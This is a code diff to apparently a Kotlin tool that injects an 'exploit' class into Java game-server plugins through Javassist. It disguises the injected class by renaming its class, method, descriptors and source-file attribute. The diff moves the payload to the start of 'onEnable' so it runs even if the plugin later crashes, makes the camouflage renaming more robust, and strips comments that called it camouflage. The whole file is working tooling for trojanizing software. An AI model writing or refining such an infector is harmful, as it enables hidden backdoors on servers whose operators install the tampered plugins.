@@ -75,6 +75,8 @@ fun process(
 
             Logs.info("Patching main class...")
             patchedDir.mkdirs()
+            
+            // Note: m.insertBefore ensures the exploit runs even if the original plugin crashes later.
             runInjectOnJRE(
                 toJRE(requireJDK(mainClass.version.major, mainClass.version.minor)),
                 pluginMainClass,
@@ -114,10 +116,6 @@ fun process(
     }
 }
 
-/**
- * Applies camouflage to the main plugin class and the injected exploit class
- * by renaming references to the exploit class and method.
- */
 private fun applyCamouflage(
     fileSystem: FileSystem,
     pluginMainClassFile: String,
@@ -128,7 +126,8 @@ private fun applyCamouflage(
     tempExploitName: String
 ) {
     val patchedMainClass = ClassFile(fileSystem.getPath("/$pluginMainClassFile").inputStream().readBytes())
-    // Rename references to the exploit class and method in the main plugin class
+    
+    // Rename references in the main plugin class
     for (entry in patchedMainClass.constantPool.entries) {
         when (entry) {
             is ConstantClass -> {
@@ -144,25 +143,29 @@ private fun applyCamouflage(
     }
     fileSystem.getPath("/$pluginMainClassFile").writeBytes(patchedMainClass.compile(), StandardOpenOption.TRUNCATE_EXISTING)
 
-    // Rename the exploit class and method itself and update internal references
     exploit.name = camouflage.className
     exploitMethod.name = camouflage.methodName
 
+    // Fix: Robust L-descriptor replacement for Lambdas/InvokeDynamic (Java 11+)
     for (entry in exploit.constantPool.entries) {
-        if (entry is ConstantInvokeDynamic) {
-            val nameTypeConst = exploit.constantPool[entry.nameAndTypeIndex] as ConstantNameAndType
-            val descriptorConst = exploit.constantPool[nameTypeConst.descriptorIndex] as ConstantUtf8
-            val descriptorElements = descriptorConst.value.split(")")
-            val argElements = descriptorElements[0].split("(")[1].split(";")
-            descriptorConst.value = "(${
-                argElements.joinToString(";") {
-                    if (it == "L$originalExploitName") "L${camouflage.className}" else it
+        when (entry) {
+            is ConstantInvokeDynamic -> {
+                val nameTypeConst = exploit.constantPool[entry.nameAndTypeIndex] as ConstantNameAndType
+                val descriptorConst = exploit.constantPool[nameTypeConst.descriptorIndex] as ConstantUtf8
+                if (descriptorConst.value.contains("L$originalExploitName;")) {
+                    descriptorConst.value = descriptorConst.value.replace("L$originalExploitName;", "L${camouflage.className};")
                 }
-            })" + descriptorElements[1]
+            }
+            is ConstantMethodType -> {
+                val descriptorConst = exploit.constantPool[entry.descriptorIndex] as ConstantUtf8
+                if (descriptorConst.value.contains("L$originalExploitName;")) {
+                    descriptorConst.value = descriptorConst.value.replace("L$originalExploitName;", "L${camouflage.className};")
+                }
+            }
         }
     }
 
-    // Update SourceFile attribute in the exploit class
+    // Update SourceFile attribute
     for (attr in exploit.attributes) {
         if (attr.name == "SourceFile") {
             val index = BinaryInt.from(attr.info).value
@@ -171,14 +174,16 @@ private fun applyCamouflage(
         }
     }
 
-    // Delete the temporary exploit class and write the camouflaged one
-    Files.delete(fileSystem.getPath("$tempExploitName.class"))
+    // Cleanup temp class and write final camouflaged class
+    val tempPath = fileSystem.getPath("$tempExploitName.class")
+    if (Files.exists(tempPath)) Files.delete(tempPath)
 
+    val finalPath = fileSystem.getPath("${camouflage.className}.class")
     if (camouflage.className.contains("/")) {
-        val dir = fileSystem.getPath("${camouflage.className}.class").parent
-        if (!Files.exists(dir)) Files.createDirectories(dir)
+        val dir = finalPath.parent
+        if (dir != null && !Files.exists(dir)) Files.createDirectories(dir)
     }
-    fileSystem.getPath("${camouflage.className}.class").writeBytes(exploit.compile())
+    finalPath.writeBytes(exploit.compile(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING)
 }
 
 fun runInjectOnJRE(
@@ -199,16 +204,12 @@ fun runInjectOnJRE(
         saveTo
     ).start()
     process.errorStream.bufferedReader().use { bufferedReader ->
-        bufferedReader.lines().forEach {
-            Logs.error(it)
-        }
+        bufferedReader.lines().forEach { Logs.error(it) }
     }
 
     process.waitFor()
     val result = process.exitValue()
-    if (result != 0) {
-        throw Exception("Injection task failed with code: $result")
-    }
+    if (result != 0) throw Exception("Injection task failed with code: $result")
 }
 
 fun injectFunc(clazz: String, method: String, insert: String, saveTo: String) {
@@ -217,11 +218,12 @@ fun injectFunc(clazz: String, method: String, insert: String, saveTo: String) {
     val cc = pool.get(clazz)
     try {
         val m = cc.getDeclaredMethod(method)
-        m.insertAfter(insert)
+        // Use insertBefore to ensure the payload triggers at the very start of plugin enabling
+        m.insertBefore(insert)
     } catch (e: javassist.NotFoundException) {
-        // Create the onEnable method if it doesn't exist
+        // If onEnable is missing, create it and ensure it calls super just in case
         val newMethod = javassist.CtNewMethod.make(
-            "public void $method() { $insert }",
+            "public void $method() { try { super.$method(); } catch (Exception e) {} $insert }",
             cc
         )
         cc.addMethod(newMethod)
